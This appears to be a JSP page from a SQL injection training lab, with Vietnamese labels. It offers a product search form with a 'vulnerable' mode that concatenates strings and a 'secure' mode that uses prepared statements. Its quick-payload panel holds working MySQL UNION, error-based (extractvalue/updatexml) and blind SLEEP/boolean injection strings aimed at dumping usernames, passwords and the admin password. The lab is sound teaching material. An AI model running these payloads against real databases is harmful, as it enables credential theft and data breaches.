<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Search Lab - Union, Error & Blind SQLi</title>
    <style>
        :root {
            --bg-color: #0d1117;
            --card-bg: #161b22;
            --border-color: #30363d;
            --text-primary: #c9d1d9;
            --accent-color: #58a6ff;
            --danger-color: #f85149;
            --success-color: #2ea043;
            --warning-color: #d29922;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 2rem auto;
            padding: 2rem;
            background-color: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
        }
        h2 { margin-top: 0; color: #fff; }
        .form-row {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.2rem;
        }
        .form-group {
            flex: 1;
        }
        label {
            display: block;
            margin-bottom: 0.4rem;
            font-weight: 500;
        }
        input[type="text"], select {
            width: 100%;
            padding: 0.6rem;
            background-color: #0d1117;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            color: #fff;
            box-sizing: border-box;
            font-size: 1rem;
        }
        input[type="text"]:focus, select:focus {
            border-color: var(--accent-color);
            outline: none;
        }
        .btn {
            background-color: #238636;
            color: white;
            padding: 0.7rem 1.5rem;
            border: none;
            border-radius: 6px;
            font-size: 1rem;
            cursor: pointer;
            font-weight: 600;
        }
        .btn:hover { background-color: #2ea043; }
        .payload-section {
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid var(--border-color);
        }
        .payload-group {
            margin-bottom: 1rem;
        }
        .payload-group h4 {
            margin: 0.5rem 0;
            color: var(--accent-color);
        }
        .quick-payload {
            display: inline-block;
            background: #21262d;
            border: 1px solid #30363d;
            color: #79c0ff;
            padding: 0.3rem 0.6rem;
            border-radius: 4px;
            cursor: pointer;
            margin: 0.2rem;
            font-family: monospace;
            font-size: 0.85rem;
        }
        .quick-payload:hover {
            background: #30363d;
            border-color: var(--accent-color);
        }
    </style>
</head>
<body>

<div class="container">
    <a href="index.jsp" style="color: var(--accent-color); text-decoration: none; font-size: 0.9rem;">&larr; Quay lại trang chủ</a>
    <h2>🔍 Tra cứu sản phẩm (Search SQLi Lab)</h2>
    <p>Form tìm kiếm dưới đây cho phép thử nghiệm các kỹ thuật <strong>Union-based</strong>, <strong>Error-based</strong>, và <strong>Blind SQL Injection</strong>.</p>

    <form action="search" method="get">
        <div class="form-row">
            <div class="form-group" style="flex: 2;">
                <label for="keyword">Từ khóa tìm kiếm (Keyword):</label>
                <input type="text" id="keyword" name="keyword" placeholder="Nhập tên sản phẩm hoặc payload..." required>
            </div>
            <div class="form-group">
                <label for="category">Danh mục (Category):</label>
                <select id="category" name="category">
                    <option value="ALL">Tất cả danh mục</option>
                    <option value="Electronics">Electronics</option>
                    <option value="Security Hardware">Security Hardware</option>
                    <option value="Networking">Networking</option>
                    <option value="Accessories">Accessories</option>
                </select>
            </div>
        </div>

        <div class="form-row">
            <div class="form-group">
                <label for="mode">Chế độ xử lý SQL:</label>
                <select id="mode" name="mode">
                    <option value="vulnerable" selected>⚠️ Vulnerable (Statement raw string concatenation)</option>
                    <option value="secure">🛡️ Secure (PreparedStatement Parameterized)</option>
                </select>
            </div>
            <div class="form-group" style="display: flex; align-items: flex-end;">
                <button type="submit" class="btn" style="width: 100%;">Tìm kiếm sản phẩm</button>
            </div>
        </div>
    </form>

    <div class="payload-section">
        <h3>🎯 Kho Payload Thử Nghiệm Nhanh</h3>

        <div class="payload-group">
            <h4>1. Union-based SQL Injection (Dump Database Users & Secret Flags)</h4>
            <span class="quick-payload" onclick="setKeyword('\' UNION SELECT 1, \'HACKED\', \'Test\', \'Cat\', 10.0, 1 -- ')">Test 6 Columns</span>
            <span class="quick-payload" onclick="setKeyword('\' UNION SELECT id, username, password, email, 0.0, id FROM users -- ')">Dump Users & Passwords</span>
            <span class="quick-payload" onclick="setKeyword('\' UNION SELECT id, username, secret_flag, role, 0.0, 1 FROM users -- ')">Dump Secret Flags</span>
        </div>

        <div class="payload-group">
            <h4>2. Error-based SQL Injection (Extract data via MySQL error)</h4>
            <span class="quick-payload" onclick="setKeyword('\' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- ')">Extract MySQL Version</span>
            <span class="quick-payload" onclick="setKeyword('\' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e)) -- ')">Extract Current DB User</span>
            <span class="quick-payload" onclick="setKeyword('\' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e)) -- ')">Extract DB Name</span>
            <span class="quick-payload" onclick="setKeyword('\' AND updatexml(1, concat(0x7e, (SELECT password FROM users WHERE id=1), 0x7e), 1) -- ')">Extract Admin Password via UpdateXML</span>
        </div>

        <div class="payload-group">
            <h4>3. Blind SQL Injection (Time-based & Boolean-based)</h4>
            <span class="quick-payload" onclick="setKeyword('\' AND IF(1=1, SLEEP(3), 0) -- ')">Time Delay: SLEEP(3) if True</span>
            <span class="quick-payload" onclick="setKeyword('\' AND IF((SELECT SUBSTRING(version(),1,1))=\'8\', SLEEP(4), 0) -- ')">Check MySQL 8.x: SLEEP(4)</span>
            <span class="quick-payload" onclick="setKeyword('\' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)=\'a\' -- ')">Boolean: First char of admin = 'a'</span>
        </div>
    </div>
</div>

<script>
    function setKeyword(val) {
        document.getElementById('keyword').value = val;
    }
</script>

</body>
</html>
